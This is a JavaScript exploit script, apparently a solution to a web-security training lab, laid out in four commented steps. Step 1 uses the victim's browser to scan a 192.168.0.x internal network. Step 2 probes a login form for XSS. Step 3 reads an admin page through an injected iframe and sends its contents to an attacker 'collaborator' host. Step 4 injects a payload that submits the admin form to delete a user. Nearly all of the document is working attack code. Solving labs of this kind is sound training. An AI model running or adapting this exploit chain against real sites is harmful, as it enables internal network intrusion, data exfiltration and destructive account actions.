/***********************************************************
 * Step 1:
 * 
 * Scan local network for the enpoint. Replace $collaboratorPay with collaborator.
 * 
************************************************************/

var q = [], collaboratorURL = 'http://$collaboratorPayload';
for (i = 1; i <= 255; i++) {
    q.push(
        function (url) {
            return function (wait) {
                fetchUrl(url, wait);
            }
        }('http://192.168.0.' + i + ':8080'));
}

for (i = 1; i <= 20; i++) {
    if (q.length) q.shift()(i * 100);
}

function fetchUrl(url, wait) {
    var controller = new AbortController(), signal = controller.signal;
    fetch(url, { signal }).then(r => r.text().then(text => {
        location = collaboratorURL + '?ip=' + url.replace(/^http:\/\//, '') + '&code=' + encodeURIComponent(text) + '&' + Date.now()
    }
    ))
        .catch(e => {
            if (q.length) {
                q.shift()(wait);
            }
        });
    setTimeout(x => {
        controller.abort();
        if (q.length) {
            q.shift()(wait);
        }
    }, wait);
}

/***********************************************************
 * Step 2:
 * 
 * Clear the code from stage 1 and enter the following code in the exploit server.
 * Replace $ip with the IP address and port number retrieved from your collaborator interaction.
 * Don't forget to add your Collaborator payload or exploit server URL again.
 * Update and deliver your exploit. We will now probe the username field for an XSS vulnerability.
 * You should retrieve a Collaborator interaction with foundXSS=1 in the URL or you will see 
 * foundXSS=1 in the log.
 * 
************************************************************/

function xss(url, text, vector) {
    location = url + '/login?time=' + Date.now() + '&username=' + encodeURIComponent(vector) + '&password=test&csrf=' + text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL) {
    fetch(url).then(r => r.text().then(text => {
        xss(url, text, '"><img src=' + collaboratorURL + '?foundXSS=1>');
    }
    ))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");


/***********************************************************
 * Step 3:
 * 
 * Clear the code from stage 2 and enter the following code in the exploit server.
 * Replace $ip with the same IP address and port number as in step 2 and don't forget 
 * to add your Collaborator payload or exploit server again. Update and deliver your exploit.
 * Your Collaborator interaction or your exploit server log should now give you the source code 
 * of the admin page.
 * 
************************************************************/

function xss(url, text, vector) {
    location = url + '/login?time=' + Date.now() + '&username=' + encodeURIComponent(vector) + '&password=test&csrf=' + text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL) {
    fetch(url).then(r => r.text().then(text => {
        xss(url, text, '"><iframe src=/admin onload="new Image().src=\'' + collaboratorURL + '?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
    }
    ))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");

/***********************************************************
 * Step 4:
 * 
 * Read the source code retrieved from step 3 in your Collaborator interaction or 
 * on the exploit server log.
 * You'll notice there's a form that allows you to delete a user.
 * Clear the code from stage 3 and enter the following code in the exploit server.
 * Replace $ip with the same IP address and port number as in steps 2 and 3.
 * The code submits the form to delete carlos by injecting an iframe pointing to 
 * the /admin page.
 * 
************************************************************/

function xss(url, text, vector) {
    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
  }
  
  function fetchUrl(url){
    fetch(url).then(r=>r.text().then(text=>
    {
      xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
    }
    ))
  }
  
  fetchUrl("http://$ip");